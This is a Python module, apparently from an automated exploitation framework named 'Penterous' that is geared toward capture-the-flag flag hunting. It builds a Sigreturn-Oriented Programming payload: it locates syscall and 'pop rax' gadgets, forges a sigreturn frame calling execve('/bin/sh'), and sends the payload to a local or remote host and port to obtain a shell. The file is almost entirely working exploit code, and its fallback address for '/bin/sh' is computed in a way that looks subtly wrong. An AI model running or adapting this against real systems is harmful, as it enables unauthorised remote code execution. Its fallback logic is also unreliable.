"""
Penterous — SROP (Sigreturn-Oriented Programming) exploit strategy.
"""
import time
import struct
from typing import Optional
from strategies.base import ExploitStrategy, ExploitResult, _ensure_flag_txt
from utils.logger import info, success, warning, error

try:
    import pwn
    PWNTOOLS_OK = True
except ImportError:
    PWNTOOLS_OK = False


class SROPStrategy(ExploitStrategy):
    """
    Sigreturn-Oriented Programming.
    Requires: syscall ; ret gadget, ability to set rax = 15 (rt_sigreturn).
    Builds a fake sigcontext frame to call execve('/bin/sh', 0, 0).
    """

    def execute(self, mode: str = 'local', host: str = None, port: int = None) -> ExploitResult:
        start = time.time()
        strategy = 'srop'

        if self.binary.bits != 64:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "SROP as implemented here requires x86-64", mode=mode)

        payload = self._build_srop_payload()
        if not payload:
            return self._make_result(False, None, strategy, b'', b'', start,
                                     "Cannot build SROP chain — missing syscall gadget", mode=mode)

        info(f"SROP payload: {len(payload)} bytes")

        tube = self._get_tube(mode, host, port)
        if tube is None:
            return self._make_result(False, None, strategy, payload, b'', start,
                                     "Failed to create tube", mode=mode)

        output = self._send_and_receive(tube, payload, interactive_shell=True)
        flag = self.hunter.hunt(output)

        return self._make_result(
            success_=flag is not None,
            flag=flag,
            strategy=strategy,
            payload=payload,
            output=output,
            start_time=start,
            mode=mode,
            host=host or '',
            port=port or 0,
        )

    def _build_srop_payload(self) -> bytes:
        syscall_gadget = (
            self.rop.find_gadget(['syscall', 'ret']) or
            self.rop.find_gadget(['syscall'])
        )
        if not syscall_gadget:
            warning("No syscall ; ret gadget found")
            return b''

        if PWNTOOLS_OK:
            try:
                import pwn
                pwn.context.arch = 'amd64'
                pwn.context.bits = 64
                pwn.context.os = 'linux'

                # Find /bin/sh in binary or use in-payload
                bin_sh_addr = 0
                if self.binary.elf:
                    try:
                        bin_sh_addr = next(self.binary.elf.search(b'/bin/sh\x00'), 0)
                    except Exception:
                        pass

                # Build frame
                frame = pwn.SigreturnFrame()
                frame.rax = 59          # execve syscall number
                frame.rdi = bin_sh_addr or (self.offset + len(b'A' * self.offset) + 0x100)
                frame.rsi = 0
                frame.rdx = 0
                frame.rip = syscall_gadget
                frame.rsp = 0

                # pop rax ; ret to set rax = SYS_rt_sigreturn (15)
                pop_rax = self.rop.find_gadget(['pop rax', 'ret'])
                if not pop_rax:
                    return b''

                payload = b'A' * self.offset
                payload += struct.pack('<Q', pop_rax)
                payload += struct.pack('<Q', 15)           # SYS_rt_sigreturn
                payload += struct.pack('<Q', syscall_gadget)
                payload += bytes(frame)
                return payload
            except Exception as e:
                warning(f"SROP frame build failed: {e}")

        return b''
